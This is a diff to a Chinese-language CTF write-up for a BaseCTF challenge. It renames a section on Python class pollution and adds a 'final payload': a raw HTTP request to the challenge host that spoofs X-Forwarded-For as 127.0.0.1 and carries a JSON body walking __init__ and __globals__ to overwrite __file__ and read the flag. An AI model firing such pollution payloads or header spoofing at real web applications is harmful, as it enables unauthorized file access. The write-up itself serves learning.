@@ -69,7 +69,7 @@ if __name__ == '__main__':
 
 <br>
 
-## 另一题的payload分析
+## 原型链污染分析
 
 <br>
 
@@ -110,3 +110,32 @@ print(instance.secret)
 #world
 ````
 
+<br>
+
+## 最终payload
+
+<br>
+
+````
+GET /pollute HTTP/1.1
+Host: challenge.basectf.fun:39759
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+X-Forwarded-For: 127.0.0.1
+Priority: u=0, i
+Content-Type: application/json
+Content-Length: 108
+
+{
+    "__init__":{
+        "__globals__":{
+            "__file__":"flag"
+          
+        }
+    }
+}
+````
